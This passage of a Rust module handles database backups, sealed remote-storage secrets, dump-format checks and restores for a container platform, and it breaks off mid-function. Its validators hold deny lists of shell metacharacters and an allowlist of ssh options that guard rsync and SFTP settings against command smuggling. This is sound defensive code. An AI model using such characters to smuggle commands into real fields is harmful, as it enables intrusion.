//! The backups of the managed databases. A backup is the dump of the engine, gzipped, in the
//! `backups` directory of the config directory, with one JSON manifest per file. A restore
//! uploads the dump back into the running container and runs the restore command of the engine.

use super::{Platform, is_local, proxy};
use crate::clock::unix_ms;
use crate::runtime::ContainerRuntime;
use anyhow::{Context, bail};
use async_compression::tokio::bufread::GzipEncoder;
use r3v3rs3_api::container::{AppName, ContainerName};
use r3v3rs3_api::error::Error;
use r3v3rs3_api::id::ShortId;
use r3v3rs3_api::platform::{
    AppEntry, BackupConfig, BackupDrillDetails, BackupEntry, EngineInfo, PitrRange,
    PitrRestoreRequest, PitrRestoreResponse, RestoreFromS3Request, RestoreFromS3Response,
    S3BackupSnapshot, WalSegment,
};
use sha2::{Digest, Sha256};
use std::sync::Arc;
use std::time::Duration;
use tokio::io::{AsyncBufReadExt, AsyncReadExt, AsyncWriteExt};

/// The settings row of the backup configuration in the platform database.
pub const BACKUP_CONFIG: &str = "backup_config";

/// The directory under the config directory that holds the backups.
pub const BACKUP_DIR: &str = "backups";

/// The settings row of the sealed S3 secret key.
pub(super) const S3_SECRET: &str = "backup_s3_secret";

/// The associated data that binds the sealed S3 secret key.
pub(super) const S3_SECRET_AAD: &str = "backup/s3/secret_key";

/// The settings row of the sealed SFTP secret key/password.
pub(super) const SFTP_SECRET: &str = "backup_sftp_secret";

/// The associated data that binds the sealed SFTP secret.
pub(super) const SFTP_SECRET_AAD: &str = "backup/sftp/secret";

/// The settings row of the sealed rsync secret password.
pub(super) const RSYNC_SECRET: &str = "backup_rsync_secret";

/// The associated data that binds the sealed rsync secret.
pub(super) const RSYNC_SECRET_AAD: &str = "backup/rsync/secret";

/// The directory inside the container that a restore uploads its dump to.
const RESTORE_DIR: &str = "/tmp/r3v3rs3-restore";

/// How the engine takes its backup: one command over `exec`, or one file to download.
struct DumpPlan {
    command: Vec<String>,
    env: Vec<String>,
    /// The file that carries the dump, for an engine that cannot write it to stdout.
    file: Option<String>,
}

/// How the engine takes its dump back: the file that the restore uploads, and the command that
/// reads it.
#[derive(Clone)]
struct RestorePlan {
    /// The target path of the upload. `None` for an engine that takes the file in place.
    upload: Option<String>,
    command: Vec<String>,
    env: Vec<String>,
}

fn is_safe_ssh_token_str(val: &str) -> bool {
    !val.is_empty()
        && !val.contains("..")
        && val
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '/' | '.' | '_' | '-'))
}

fn validate_ssh_o_option(opt: &str) -> anyhow::Result<()> {
    let Some((key, val)) = opt.split_once('=') else {
        bail!("invalid -o option format: expected key=value");
    };
    match key.to_ascii_lowercase().as_str() {
        "stricthostkeychecking"
        | "userknownhostsfile"
        | "connecttimeout"
        | "batchmode"
        | "compression"
        | "serveraliveinterval"
        | "serveralivecountmax"
        | "port"
        | "identityfile" => {}
        _ => bail!("disallowed ssh -o option: {key}"),
    }
    if !is_safe_ssh_token_str(val) {
        bail!("unsafe value for ssh -o option: {key}");
    }
    Ok(())
}

fn validate_ssh_token(arg: &str, next: Option<&str>) -> anyhow::Result<usize> {
    match arg {
        "-4" | "-6" | "-q" | "-v" => Ok(1),
        "-p" => {
            let port = next.ok_or_else(|| anyhow::anyhow!("missing port for -p"))?;
            let num: u16 = port.parse().map_err(|_| anyhow::anyhow!("invalid port"))?;
            if num == 0 {
                bail!("port cannot be 0");
            }
            Ok(2)
        }
        "-i" | "-F" => {
            let path = next.ok_or_else(|| anyhow::anyhow!("missing path for {arg}"))?;
            if !is_safe_ssh_token_str(path) {
                bail!("unsafe path for {arg}");
            }
            Ok(2)
        }
        "-o" => {
            let opt = next.ok_or_else(|| anyhow::anyhow!("missing argument for -o"))?;
            validate_ssh_o_option(opt)?;
            Ok(2)
        }
        _ => bail!("disallowed ssh option: {arg}"),
    }
}

pub(crate) fn validate_rsync_ssh_options(options: &str) -> anyhow::Result<()> {
    let trimmed = options.trim();
    if trimmed.is_empty() {
        return Ok(());
    }
    const FORBIDDEN: &[char] = &[
        ';', '&', '|', '`', '$', '(', ')', '{', '}', '<', '>', '\n', '\r', '\\', '"', '\'',
    ];
    if trimmed.contains(FORBIDDEN) {
        bail!("rsync ssh_options contains forbidden characters");
    }
    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    let mut idx = 0;
    if tokens.first().copied() == Some("ssh") {
        idx = 1;
    }
    while idx < tokens.len() {
        let arg = tokens[idx];
        idx += validate_ssh_token(arg, tokens.get(idx + 1).copied())?;
    }
    Ok(())
}

fn format_rsync_rsh(ssh_options: &str) -> anyhow::Result<String> {
    validate_rsync_ssh_options(ssh_options)?;
    let trimmed = ssh_options.trim();
    if trimmed.starts_with("ssh") {
        Ok(trimmed.to_string())
    } else {
        Ok(format!("ssh {trimmed}"))
    }
}

pub(crate) fn sanitize_sftp_path_component(component: &str) -> anyhow::Result<&str> {
    let trimmed = component.trim();
    if trimmed.is_empty() {
        bail!("sftp path component cannot be empty");
    }
    const FORBIDDEN: &[char] = &['\n', '\r', '\0', '"', '\\', '!', ';', '`', '$'];
    if trimmed.contains(FORBIDDEN) {
        bail!("sftp path component contains forbidden characters");
    }
    Ok(trimmed)
}

pub(crate) fn validate_sftp_config(sftp: &r3v3rs3_api::platform::SftpConfig) -> anyhow::Result<()> {
    if !sftp.path.is_empty() {
        sanitize_sftp_path_component(&sftp.path)?;
    }
    const FORBIDDEN_HOST_USER: &[char] = &[
        '\n', '\r', '\0', ' ', '\t', ';', '&', '|', '`', '$', '\'', '"', '\\',
    ];
    if sftp.host.contains(FORBIDDEN_HOST_USER) || sftp.host.starts_with('-') {
        bail!("sftp host contains invalid characters");
    }
    if sftp.user.contains(FORBIDDEN_HOST_USER) || sftp.user.starts_with('-') {
        bail!("sftp user contains invalid characters");
    }
    Ok(())
}

const SQL_PREFIXES: &[&str] = &[
    "--", "/*", "SET ", "CREATE ", "INSERT ", "DROP ", "ALTER ", "USE ", "\\",
];

pub fn validate_backup_engine_format(engine: &str, bytes: &[u8]) -> anyhow::Result<()> {
    if bytes.is_empty() {
        bail!("backup dump is empty");
    }
    match engine {
        "redis" => validate_redis_dump(bytes),
        "postgres" => validate_postgres_dump(bytes),
        "mysql" | "mariadb" => validate_mysql_dump(engine, bytes),
        "mongodb" => validate_mongodb_dump(bytes),
        _ => Ok(()),
    }
}

fn validate_redis_dump(bytes: &[u8]) -> anyhow::Result<()> {
    if !bytes.starts_with(b"REDIS") {
        bail!("invalid backup format for redis: missing REDIS magic header");
    }
    Ok(())
}

fn validate_postgres_dump(bytes: &[u8]) -> anyhow::Result<()> {
    if bytes.starts_with(b"REDIS") {
        bail!("cannot restore redis dump into postgres database");
    }
    if bytes.starts_with(b"PGDMP") {
        return Ok(());
    }
    validate_sql_dump("postgres", bytes)
}

fn validate_mysql_dump(engine: &str, bytes: &[u8]) -> anyhow::Result<()> {
    if bytes.starts_with(b"REDIS") {
        bail!("cannot restore redis dump into {engine} database");
    }
    if bytes.starts_with(b"PGDMP") {
        bail!("cannot restore postgres custom dump into {engine} database");
    }
    validate_sql_dump(engine, bytes)
}

fn validate_mongodb_dump(bytes: &[u8]) -> anyhow::Result<()> {
    if bytes.starts_with(b"REDIS") {
        bail!("cannot restore redis dump into mongodb database");
    }
    if bytes.starts_with(b"PGDMP") {
        bail!("cannot restore postgres custom dump into mongodb database");
    }
    if is_plain_sql(bytes) {
        bail!("cannot restore sql dump into mongodb database");
    }
    Ok(())
}

fn is_plain_sql(bytes: &[u8]) -> bool {
    let sample = &bytes[..bytes.len().min(1024)];
    if sample.contains(&0) {
        return false;
    }
    match std::str::from_utf8(sample) {
        Ok(text) => {
            let trimmed = text.trim_start();
            SQL_PREFIXES
                .iter()
                .any(|prefix| trimmed.starts_with(prefix))
        }
        Err(_) => false,
    }
}

fn validate_sql_dump(engine: &str, bytes: &[u8]) -> anyhow::Result<()> {
    let sample = &bytes[..bytes.len().min(1024)];
    if sample.contains(&0) {
        bail!("invalid {engine} backup format: binary content detected in SQL dump");
    }
    let text = std::str::from_utf8(sample)
        .map_err(|_| anyhow::anyhow!("invalid {engine} backup format: non-UTF-8 content"))?;
    if !is_plain_sql(bytes) {
        bail!("invalid {engine} backup format: unrecognized SQL dump header");
    }
    check_cross_sql_mismatch(engine, text)
}

fn check_cross_sql_mismatch(engine: &str, text: &str) -> anyhow::Result<()> {
    if engine == "postgres" && is_mysql_signature(text) {
        bail!("cannot restore MySQL/MariaDB dump into postgres database");
    }
    if (engine == "mysql" || engine == "mariadb") && is_postgres_signature(text) {
        bail!("cannot restore PostgreSQL dump into {engine} database");
    }
    Ok(())
}

fn is_mysql_signature(text: &str) -> bool {
    text.contains("MySQL dump")
        || text.contains("MariaDB dump")
        || text.contains("/*M!")
        || text.contains("/*!40101")
}

fn is_postgres_signature(text: &str) -> bool {
    text.contains("PostgreSQL database dump") || text.contains("pg_dump")
}

fn validate_backup_targets(config: &BackupConfig) -> anyhow::Result<()> {
    if let Some(ref rsync) = config.rsync {
        validate_rsync_ssh_options(&rsync.ssh_options)?;
    }
    if let Some(ref sftp) = config.sftp {
        validate_sftp_config(sftp)?;
    }
    Ok(())
}

impl Platform {
    /// The backup settings stored in the platform database, or the defaults.
    pub async fn backup_config(&self) -> anyhow::Result<BackupConfig> {
        match self.store.setting(BACKUP_CONFIG).await? {
            Some(json) => Ok(serde_json::from_str(&json)?),
            None => Ok(BackupConfig::default()),
        }
    }

    /// Replaces the backup settings. Secret keys/passwords in the request replace the stored ones,
    /// empty ones keep them, and removing a target clears its secret. The settings are stored
    /// without secrets; they live sealed in their own rows.
    pub async fn set_backup_config(&self, mut config: BackupConfig) -> anyhow::Result<()> {
        validate_backup_targets(&config)?;
        let mut tx = self.store.pool().begin().await?;
        self.save_s3_secret(&mut tx, &mut config.s3).await?;
        self.save_sftp_secret(&mut tx, &mut config.sftp).await?;
        self.save_rsync_secret(&mut tx, &mut config.rsync).await?;
        let json = serde_json::to_string(&config)?;
        self.store
            .set_setting_tx(&mut tx, BACKUP_CONFIG, Some(&json))
            .await?;
        tx.commit().await?;
        Ok(())
    }

    async fn save_s3_secret(
        &self,
        tx: &mut sqlx::Transaction<'_, sqlx::Sqlite>,
        s3: &mut Option<r3v3rs3_api::platform::S3Config>,
    ) -> anyhow::Result<()> {
        let secret = s3
            .as_mut()
            .map(|s| std::mem::take(&mut s.secret_key))
            .unwrap_or_default();
        match (s3.is_some(), secret.is_empty()) {
            (true, false) => {
                let sealed = hex::encode(self.keys().seal(S3_SECRET_AAD, secret.as_bytes())?);
                self.store
                    .set_setting_tx(tx, S3_SECRET, Some(&sealed))
                    .await
            }
            (true, true) => Ok(()),
            (false, _) => self.store.set_setting_tx(tx, S3_SECRET, None).await,
        }
    }

    async fn save_sftp_secret(
        &self,
        tx: &mut sqlx::Transaction<'_, sqlx::Sqlite>,
        sftp: &mut Option<r3v3rs3_api::platform::SftpConfig>,
    ) -> anyhow::Result<()> {
        let (key, password) = sftp
            .as_mut()
            .map(|s| (std::mem::take(&mut s.key), std::mem::take(&mut s.password)))
            .unwrap_or_default();
        let secret = if !key.is_empty() { key } else { password };
        match (sftp.is_some(), secret.is_empty()) {
            (true, false) => {
                let sealed = hex::encode(self.keys().seal(SFTP_SECRET_AAD, secret.as_bytes())?);
                self.store
                    .set_setting_tx(tx, SFTP_SECRET, Some(&sealed))
                    .await
            }
            (true, true) => Ok(()),
            (false, _) => self.store.set_setting_tx(tx, SFTP_SECRET, None).await,
        }
    }

    async fn save_rsync_secret(
        &self,
        tx: &mut sqlx::Transaction<'_, sqlx::Sqlite>,
        rsync: &mut Option<r3v3rs3_api::platform::RsyncConfig>,
    ) -> anyhow::Result<()> {
        let secret = rsync
            .as_mut()
            .map(|r| std::mem::take(&mut r.password))
            .unwrap_or_default();
        match (rsync.is_some(), secret.is_empty()) {
            (true, false) => {
                let sealed = hex::encode(self.keys().seal(RSYNC_SECRET_AAD, secret.as_bytes())?);
                self.store
                    .set_setting_tx(tx, RSYNC_SECRET, Some(&sealed))
                    .await
            }
            (true, true) => Ok(()),
            (false, _) => self.store.set_setting_tx(tx, RSYNC_SECRET, None).await,
        }
    }

    /// The S3 secret key, unsealed. `None` when no secret is stored.
    pub async fn s3_secret(&self) -> anyhow::Result<Option<String>> {
        let Some(sealed) = self.store.setting(S3_SECRET).await? else {
            return Ok(None);
        };
        let sealed_bytes = hex::decode(sealed)?;
        let bytes = self.keys().open(S3_SECRET_AAD, &sealed_bytes)?;
        Ok(Some(String::from_utf8(bytes)?))
    }

    /// The SFTP password or private key, unsealed. `None` when no secret is stored.
    pub async fn sftp_secret(&self) -> anyhow::Result<Option<String>> {
        let Some(sealed) = self.store.setting(SFTP_SECRET).await? else {
            return Ok(None);
        };
        let sealed_bytes = hex::decode(sealed)?;
        let bytes = self.keys().open(SFTP_SECRET_AAD, &sealed_bytes)?;
        Ok(Some(String::from_utf8(bytes)?))
    }

    /// The rsync password, unsealed. `None` when no secret is stored.
    pub async fn rsync_secret(&self) -> anyhow::Result<Option<String>> {
        let Some(sealed) = self.store.setting(RSYNC_SECRET).await? else {
            return Ok(None);
        };
        let sealed_bytes = hex::decode(sealed)?;
        let bytes = self.keys().open(RSYNC_SECRET_AAD, &sealed_bytes)?;
        Ok(Some(String::from_utf8(bytes)?))
    }

    /// The backups of one database, newest first.
    pub async fn list_backups(&self, db_id: ShortId) -> anyhow::Result<Vec<BackupEntry>> {
        let dir = self.backup_dir(db_id).await?;
        let mut entries = Vec::new();
        let mut reader = match tokio::fs::read_dir(&dir).await {
            Ok(reader) => reader,
            // A database without a backup has no directory yet.
            Err(err) if err.kind() == std::io::ErrorKind::NotFound => return Ok(entries),
            Err(err) => return Err(err.into()),
        };
        while let Some(file) = reader.next_entry().await? {
            let path = file.path();
            if path.extension().is_some_and(|ext| ext == "json")
                && let Ok(json) = tokio::fs::read(&path).await
                && let Ok(entry) = serde_json::from_slice::<BackupEntry>(&json)
            {
                entries.push(entry);
            }
        }
        entries.sort_by_key(|entry| std::cmp::Reverse(entry.created_at));
        Ok(entries)
    }

    /// Lists all database backups across all databases, sorted newest first.
    pub async fn list_all_backups(&self) -> anyhow::Result<Vec<BackupEntry>> {
        let apps = self.apps().await?;
        let mut all = Vec::new();
        for app in apps.into_iter().filter(|a| a.spec.database.is_some()) {
            if let Ok(backups) = self.list_backups(app.id).await {
                all.extend(backups);
            }
        }
        all.sort_by_key(|entry| std::cmp::Reverse(entry.created_at));
        Ok(all)
    }

    /// Computes high-level statistics and overview of all backups in the platform.
    pub async fn backups_overview(&self) -> anyhow::Result<r3v3rs3_api::platform::BackupsOverview> {
        let all = self.list_all_backups().await?;
        let config = self.backup_config().await?;
        let total_bytes: u64 = all.iter().map(|b| b.size).sum();
        let total_backups = all.len();
        let last_backup_at = all.first().map(|b| b.created_at);
        let total_databases = self
            .apps()
            .await?
            .into_iter()
            .filter(|app| app.spec.database.is_some())
            .count();
        let s3_enabled = config.s3.is_some();
        let heartbeat_configured = config
            .heartbeat_url
            .as_ref()
            .is_some_and(|u| !u.trim().is_empty());

        Ok(r3v3rs3_api::platform::BackupsOverview {
            total_backups,
            total_bytes,
            total_databases,
            last_backup_at,
            schedule: config.schedule,
            s3_enabled,
            retention_count: config.keep,
            restore_test_enabled: config.restore_test_enabled,
            heartbeat_configured,
        })
    }

    async fn capture_database_dump(
        &self,
        db_id: ShortId,
        dump_path: &std::path::Path,
    ) -> anyhow::Result<(AppEntry, String, u64, String)> {
        let (app, container, runtime) = self.database_container(db_id).await?;
        let engine = app
            .spec
            .database
            .clone()
            .context("the app is not a managed database")?;
        let info = r3v3rs3_api::platform::app_engine_info(&app.spec)
            .context("the engine is not in the database catalog")?;
        let password = self.database_password(db_id, &info).await?;
        let plan = dump_plan(&engine, &info, &password)?;
        let dump = DumpFile::new(&self.backup_dir).await?;
        take_dump_to(&runtime, &container, plan, &dump.path).await?;
        let (size, sha256) = super::transfer::gzip_file(&dump.path, dump_path).await?;
        Ok((app, engine, size, sha256))
    }

    /// Dumps the database of the local target into the backup directory, and applies the
    /// retention of the settings.
    pub async fn run_backup(&self, db_id: ShortId) -> anyhow::Result<BackupEntry> {
        let _guard = self.track_job();
        let app = self.app(db_id).await?;
        let _lock = self.lock_app(&app)?;
        let dir = self.backup_dir(db_id).await?;
        tokio::fs::create_dir_all(&dir).await?;
        let id = backup_id();
        let dump_path = dir.join(format!("{id}.dump.gz"));
        let res = async {
            let (app, engine, size, sha256) = self.capture_database_dump(db_id, &dump_path).await?;

            let entry = BackupEntry {
                id,
                app: db_id,
                name: app.name.to_string(),
                engine,
                size,
                sha256,
                created_at: unix_ms() as i64,
                verified_at: None,
                verification_status: None,
                drill: None,
            };
            self.store_backup(db_id, &entry, &dump_path).await?;
            self.apply_retention(db_id).await?;
            Ok(entry)
        }
        .await;

        if res.is_err() {
            let _ = tokio::fs::remove_file(&dump_path).await;
        }
        res
    }

    /// Writes one backup file manifest, uploads it to remote targets, and runs initial
    /// restore testing when enabled.
    async fn store_backup(
        &self,
        db_id: ShortId,
        entry: &BackupEntry,
        dump_path: &std::path::Path,
    ) -> anyhow::Result<()> {
        let dir = self.backup_dir(db_id).await?;
        let manifest_path = dir.join(format!("{}.json", entry.id));
        let manifest = serde_json::to_vec(entry)?;
        tokio::fs::write(&manifest_path, manifest).await?;

        self.dispatch_remote_backups(entry, dump_path, &manifest_path)
            .await;

        let summary = format!(
            "Backup of database '{}' completed successfully ({} bytes)",
            entry.name, entry.size
        );
        let data = serde_json::json!({
            "backup_id": entry.id,
            "db_id": db_id.to_string(),
            "db_name": entry.name,
            "engine": entry.engine,
            "size_bytes": entry.size,
        });
        self.dispatch_webhook_event(
            r3v3rs3_api::webhook::WebhookEvent::BackupSuccess,
            summary,
            data,
        )
        .await;

        let config = self.backup_config().await.unwrap_or_default();
        if config.restore_test_enabled {
            let _ = self.verify_backup(db_id, &entry.id).await;
        }
        Ok(())
    }

    async fn dispatch_remote_backups(
        &self,
        entry: &BackupEntry,
        dump_path: &std::path::Path,
        manifest_path: &std::path::Path,
    ) {
        if let Err(err) = self.upload_to_s3(entry, dump_path).await {
            tracing::error!(
                err = format!("{err:#}"),
                "failed to upload the backup to S3"
            );
            let summary = format!(
                "Remote S3 backup upload failed for database '{}'",
                entry.name
            );
            let data = serde_json::json!({
                "backup_id": entry.id,
                "db_id": entry.app.to_string(),
                "db_name": entry.name,
                "target": "s3",
                "error": err.to_string(),
            });
            self.dispatch_webhook_event(
                r3v3rs3_api::webhook::WebhookEvent::BackupUploadFailed,
                summary,
                data,
            )
            .await;
        }
        if let Err(err) = self.upload_to_sftp(entry, dump_path, manifest_path).await {
            tracing::error!(
                err = format!("{err:#}"),
                "failed to upload the backup to SFTP"
            );
        }
        if let Err(err) = self.upload_to_rsync(entry, dump_path, manifest_path).await {
            tracing::error!(
                err = format!("{err:#}"),
                "failed to sync the backup with rsync"
            );
        }
    }

    /// Removes one backup and its manifest.
    pub async fn delete_backup(&self, db_id: ShortId, backup_id: &str) -> anyhow::Result<()> {
        let entry = self.backup_entry(db_id, backup_id).await?;
        let dir = self.backup_dir(db_id).await?;
        tokio::fs::remove_file(dir.join(format!("{}.dump.gz", entry.id))).await?;
        tokio::fs::remove_file(dir.join(format!("{}.json", entry.id))).await?;
        Ok(())
    }

    /// One stored backup, opened for reading, and its size. A download reads it in pieces,
    /// so a backup of any size passes without being held in memory.
    pub async fn open_backup(
        &self,
        db_id: ShortId,
        backup_id: &str,
    ) -> anyhow::Result<(tokio::fs::File, u64)> {
        let entry = self.backup_entry(db_id, backup_id).await?;
        let dir = self.backup_dir(db_id).await?;
        let file = tokio::fs::File::open(dir.join(format!("{}.dump.gz", entry.id))).await?;
        let size = file.metadata().await?.len();
        Ok((file, size))
    }

    /// The decompressed dump of one stored backup.
    pub(super) async fn restore_dump_file(
        &self,
        db_id: ShortId,
        backup_id: &str,
    ) -> anyhow::Result<DumpFile> {
        let entry = self.backup_entry(db_id, backup_id).await?;
        let dir = self.backup_dir(db_id).await?;
        DumpFile::gunzip(&dir.join(format!("{}.dump.gz", entry.id)), &self.backup_dir).await
    }

    async fn dispatch_backup_restored(
        &self,
        db_id: ShortId,
        app_name: &str,
        engine: &str,
        backup_id: &str,
    ) {
        let summary =
            format!("Backup '{backup_id}' restored successfully into database '{app_name}'");
        let data = serde_json::json!({
            "backup_id": backup_id,
            "db_id": db_id.to_string(),
            "db_name": app_name,
            "engine": engine,
        });
        self.dispatch_webhook_event(
            r3v3rs3_api::webhook::WebhookEvent::BackupRestored,
            summary,
            data,
        )
        .await;
    }

    async fn database_restore_context(
        &self,
        db_id: ShortId,
        app: &AppEntry,
    ) -> anyhow::Result<(String, EngineInfo, RestorePlan)> {
        let engine = app
            .spec
            .database
            .clone()
            .context("the app is not a managed database")?;
        let info = r3v3rs3_api::platform::app_engine_info(&app.spec)
            .context("the engine is not in the database catalog")?;
        let password = self.database_password(db_id, &info).await?;
        let plan = restore_plan(&engine, &info, &password)?;
        Ok((engine, info, plan))
    }

    async fn execute_and_validate_restore(
        runtime: &Arc<dyn ContainerRuntime>,
        container: &ContainerName,
        plan: &RestorePlan,
        engine: &str,
        dump: &DumpFile,
        data_path: &str,
    ) -> anyhow::Result<()> {
        validate_backup_engine_format(engine, &dump.head().await?).map_err(|err| {
            Error::RestoreFailed {
                reason: format!("{err:#}"),
            }
        })?;
        run_restore(runtime, container, plan, dump, data_path)
            .await
            .map_err(|err| Error::RestoreFailed {
                reason: format!("{err:#}"),
            })?;
        Ok(())
    }

    /// Uploads a stored backup into the running container of the database and runs the restore
    /// command of the engine. Redis replaces its dump file and restarts.
    pub async fn restore_backup(&self, db_id: ShortId, backup_id: &str) -> anyhow::Result<()> {
        let app = self.app(db_id).await?;
        let _lock = self.lock_app(&app)?;
        let (app, container, runtime) = self.database_container(db_id).await?;
        let (engine, info, plan) = self.database_restore_context(db_id, &app).await?;
        let dump = self.restore_dump_file(db_id, backup_id).await?;
        Self::execute_and_validate_restore(
            &runtime,
            &container,
            &plan,
            &engine,
            &dump,
            &info.data_path,
        )
        .await?;
        self.after_restore(db_id, &engine, &app, (&runtime, &container))
            .await?;
        self.dispatch_backup_restored(db_id, app.name.as_str(), &engine, backup_id)
            .await;
        Ok(())
    }

    /// Brings the accounts and the archive of a restored database up to date. The dumps hold
    /// no account passwords; Redis keeps its users in the ACL file of its volume, which a
    /// restore does not touch.
    async fn after_restore(
        &self,
        db_id: ShortId,
        engine: &str,
        app: &AppEntry,
        (runtime, container): (&Arc<dyn ContainerRuntime>, &ContainerName),
    ) -> anyhow::Result<()> {
        if engine != "redis" {
            return self.reapply_tenants(db_id).await;
        }
        if super::wal::archives(Some("redis"), app.target) {
            self.archive_restored_redis(db_id, runtime, container)
                .await?;
        }
        Ok(())
    }

    /// A restored Redis runs without the AOF that it set aside: the AOF is written again from
    /// the restored data, and the archive closes its old history, which the restore left, and
    /// takes a new base.
    async fn archive_restored_redis(
        &self,
        db_id: ShortId,
        runtime: &Arc<dyn ContainerRuntime>,
        container: &ContainerName,
    ) -> anyhow::Result<()> {
        self.ensure_aof(db_id, runtime, container).await?;
        self.start_history(db_id).await?;
        self.take_aof_base_locked(db_id).await?;
        Ok(())
    }

    /// Extracts the dump bytes of a source database, either from its running container or from
    /// its latest backup.
    async fn get_clone_dump(
        &self,
        source_id: ShortId,
        engine: &str,
        info: &EngineInfo,
    ) -> anyhow::Result<DumpFile> {
        if let Ok((_app, container, runtime)) = self.database_container(source_id).await {
            let password = self.database_password(source_id, info).await?;
            let plan = dump_plan(engine, info, &password)?;
            let dump = DumpFile::new(&self.backup_dir).await?;
            match take_dump_to(&runtime, &container, plan, &dump.path).await {
                Ok(()) => return Ok(dump),
                Err(err) => {
                    tracing::warn!(%source_id, err = format!("{err:#}"), "the running source gave no dump; the clone uses its latest backup");
                }
            }
        }
        let backups = self.list_backups(source_id).await?;
        if let Some(latest) = backups.first() {
            return self.restore_dump_file(source_id, &latest.id).await;
        }
        bail!("source database is not running and has no backups to clone from");
    }

    /// Waits for a cloned database container to be ready and restores the dump into it.
    async fn wait_and_restore(
        &self,
        db_id: ShortId,
        plan: &RestorePlan,
        dump: DumpFile,
        data_path: &str,
    ) -> anyhow::Result<()> {
        retry_until(
            Duration::from_secs(60),
            Duration::from_millis(1500),
            || async {
                let (_app, container, runtime) = self.database_container(db_id).await?;
                run_restore(&runtime, &container, plan, &dump, data_path).await
            },
        )
        .await
        .context("the new database container did not take the restore")?;
        tracing::info!(%db_id, "database clone restored successfully");
        // The tenants copied from the source get their stored passwords, and a Redis writes
        // its AOF again.
        let (app, container, runtime) = self.database_container(db_id).await?;
        let engine = app.spec.database.clone().unwrap_or_default();
        self.after_restore(db_id, &engine, &app, (&runtime, &container))
            .await
    }

    /// Copies data from a source database into a newly deployed cloned database.
    pub async fn restore_clone_data(
        self: &Arc<Self>,
        source_id: ShortId,
        dest_id: ShortId,
        dest_password: &str,
    ) -> anyhow::Result<()> {
        let source = self.app(source_id).await?;
        let engine = source
            .spec
            .database
            .clone()
            .context("the source app is not a managed database")?;
        let info = r3v3rs3_api::platform::app_engine_info(&source.spec)
            .context("the engine is not in the database catalog")?;

        let dump = self.get_clone_dump(source_id, &engine, &info).await?;
        self.copy_tenants(source_id, dest_id).await?;
        let restore = restore_plan(&engine, &info, dest_password)?;
        let platform = self.clone();
        let data_path = info.data_path.clone();

        tokio::spawn(async move {
            if let Err(err) = platform
                .wait_and_restore(dest_id, &restore, dump, &data_path)
                .await
            {
                tracing::error!(%err, app = %dest_id, "failed to restore cloned data into new database");
            }
        });
        Ok(())
    }

    /// Lists database backup snapshots stored in the configured S3 storage.
    pub async fn list_s3_backups(
        &self,
        db_filter: Option<&str>,
    ) -> anyhow::Result<Vec<S3BackupSnapshot>> {
        let config = self.backup_config().await?;
        let Some(s3) = config.s3 else {
            return Err(Error::S3NotConfigured.into());
        };
        let Some(secret) = self.s3_secret().await? else {
            return Err(Error::S3NotConfigured.into());
        };
        let s3 = r3v3rs3_api::platform::S3Config {
            secret_key: secret,
            ..s3
        };
        let http_client = self.http().await?;
        let filter = db_filter.unwrap_or_default();
        let items = super::s3::list_objects(http_client, &s3, filter)
            .await
            .map_err(|err| Error::S3OperationFailed {
                reason: err.to_string(),
            })?;
        let mut snapshots = Vec::new();
        for item in items {
            if let Some(snap) =
                parse_backup_snapshot(&s3.prefix, &item.key, item.size, &item.last_modified)
            {
                if let Some(f) = db_filter
                    && !snap.database_name.eq_ignore_ascii_case(f)
                {
                    continue;
                }
                snapshots.push(snap);
            }
        }
        snapshots.sort_by(|a, b| b.last_modified.cmp(&a.last_modified));
        Ok(snapshots)
    }

    /// One S3 backup snapshot, downloaded into a file under the backup directory and opened
    /// for reading, and its size. The file is removed at once; the open handle keeps its
    /// content until the download to the caller ends.
    pub async fn open_s3_backup(&self, key: &str) -> anyhow::Result<(tokio::fs::File, u64)> {
        let dump = self.download_s3_dump(key).await?;
        let file = tokio::fs::File::open(&dump.path).await?;
        let size = file.metadata().await?.len();
        Ok((file, size))
    }

    /// Downloads one S3 backup snapshot into a dump file under the backup directory. The
    /// snapshot is outside input, so it is bounded like a decompressed dump.
    async fn download_s3_dump(&self, key: &str) -> anyhow::Result<DumpFile> {
        let config = self.backup_config().await?;
        let (Some(s3), Some(secret)) = (config.s3, self.s3_secret().await?) else {
            return Err(Error::S3NotConfigured.into());
        };
        let s3 = r3v3rs3_api::platform::S3Config {
            secret_key: secret,
            ..s3
        };
        let dump = DumpFile::new(&self.backup_dir).await?;
        let mut room = super::transfer::DiskRoom::new(&self.backup_dir)?;
        super::s3::download_to_file(self.http().await?, &s3, key, (&dump.path, &mut room))
            .await
            .map_err(|err| Error::S3OperationFailed {
                reason: format!("{err:#}"),
            })?;
        Ok(dump)
    }

    /// Restores a database from an S3 remote backup snapshot.
    pub async fn restore_s3_backup(
        self: &Arc<Self>,
        req: RestoreFromS3Request,
        caller: &str,
    ) -> anyhow::Result<RestoreFromS3Response> {
        let raw = self.download_s3_dump(&req.key).await?;
        let dump = if is_gzipped(&raw.head().await?) {
            DumpFile::gunzip(&raw.path, &self.backup_dir).await?
        } else {
            raw
        };
        if let Some(target_id) = req.target_db_id {
            self.restore_s3_into_existing(target_id, dump, req.engine.as_deref())
                .await
        } else {
            self.restore_s3_as_new(req, caller, dump).await
        }
    }

    fn validate_target_engine(actual: &str, requested: Option<&str>) -> anyhow::Result<()> {
        if let Some(req_engine) = requested
            && !req_engine.eq_ignore_ascii_case(actual)
        {
            bail!(Error::RestoreFailed {
                reason: format!(
                    "requested engine '{req_engine}' does not match target database engine '{actual}'"
                ),
            });
        }
        Ok(())
    }

    pub(super) async fn restore_s3_into_existing(
        &self,
        target_id: ShortId,
        dump: DumpFile,
        requested_engine: Option<&str>,
    ) -> anyhow::Result<RestoreFromS3Response> {
        let app = self.app(target_id).await?;
        let _lock = self.lock_app(&app)?;
        let (app, container, runtime) = self.database_container(target_id).await?;
        let (engine, info, plan) = self.database_restore_context(target_id, &app).await?;
        Self::validate_target_engine(&engine, requested_engine)?;
        Self::execute_and_validate_restore(
            &runtime,
            &container,
            &plan,
            &engine,
            &dump,
            &info.data_path,
        )
        .await?;
        self.after_restore(target_id, &engine, &app, (&runtime, &container))
            .await?;
        Ok(RestoreFromS3Response {
            success: true,
            message: format!("restored snapshot into {}", app.name),
            app_id: Some(app.id),
            app_name: Some(app.name.to_string()),
        })
    }

    async fn restore_s3_as_new(
        self: &Arc<Self>,
        req: RestoreFromS3Request,
        caller: &str,
        dump: DumpFile,
    ) -> anyhow::Result<RestoreFromS3Response> {
        let (app_req, engine_key, info) = resolve_s3_restore_app(self, &req).await?;
        validate_backup_engine_format(&engine_key, &dump.head().await?).map_err(|err| {
            Error::RestoreFailed {
